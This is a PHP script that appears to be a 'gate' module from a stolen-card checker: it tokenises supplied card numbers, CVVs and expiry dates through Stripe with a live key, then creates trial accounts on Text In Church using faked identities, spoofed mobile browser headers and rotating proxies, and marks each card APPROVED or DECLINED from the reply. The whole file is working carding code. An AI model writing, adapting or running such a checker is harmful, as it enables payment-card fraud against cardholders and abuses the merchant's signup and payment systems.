<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730&time_on_page='.rand(50000, 100000).'&key=pk_live_1ejqRnB4uV3TIx2ckiJ0pwJP';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$data = '{"agreement":true,"account_name":"'.$fake->first.' Chruch","account_first_name":"'.$fake->first.'","account_last_name":"'.$fake->last.'","account_email":"'.$fake->email.'","account_email_confirm":"'.$fake->email.'","account_mobile":"17155717774","account_phone":"","account_address1":"12 main street","account_city":"Brewster","account_zip":"10509","account_state":"NY","account_country":"US","account_referer_id":null,"cart":"9jY7Afl8E8F89QSa","card_token":"'.$tok.'","products":"basic_yearly","discount":"17OFF","trialDuration":14,"account_brand":"tic"}';

$headers = [
	'authority: api.textinchurch.com',
	'accept: application/json, text/plain, */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json',
	'origin: https://app.textinchurch.com',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
];

$r2 = $this->curlx->Post('https://api.textinchurch.com/API/1_0/account.php', $data, $headers, null, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

if (empty($r2->body)) goto start;

if (strpos($r2->body, 'account_approval') !== false) {
	$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CVV CARD - Account Approval!"];

	goto end;
}

$json_r2 = json_decode($r2->body);

if (!isset($json_r2->error)) {
	$empty = "Error Message is Empty";

	goto start;
}

$err = isset($json_r2->error->msg) ? trim(str_replace('Stripe:', '', $json_r2->error->msg)).'!' : '';

$status = $this->response->Stripe($r2->body, $err, 'auth');

end: